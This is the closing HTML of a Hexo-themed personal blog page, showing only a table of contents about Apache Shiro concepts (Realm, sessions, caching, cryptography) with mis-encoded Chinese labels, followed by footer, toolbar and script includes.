href="#Realm%EF%BC%88%E6%95%B0%E6%8D%AE%E6%BA%90-%E8%AE%A4%E8%AF%81-%E6%8E%88%E6%9D%83%E5%AE%9E%E7%8E%B0%EF%BC%89"><span class="nav-text">Realmï¼ˆæ•°æ®æº + è®¤è¯&#x2F;æˆæƒå®ç°ï¼‰</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SessionManager-SessionDAO"><span class="nav-text">SessionManager &#x2F; SessionDAO</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CacheManager%EF%BC%88%E7%BC%93%E5%AD%98%EF%BC%89"><span class="nav-text">CacheManagerï¼ˆç¼“å­˜ï¼‰</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cryptography%EF%BC%88%E5%AF%86%E7%A0%81%E5%AD%A6%E5%B7%A5%E5%85%B7%EF%BC%89"><span class="nav-text">Cryptographyï¼ˆå¯†ç å­¦å·¥å…·ï¼‰</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8-3"><span class="nav-text">åŸºæœ¬ä½¿ç”¨</span></a></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        55 posts in total
                    </span>
                    
                        <span>
                            1070.8k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="åœ–å±¤_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>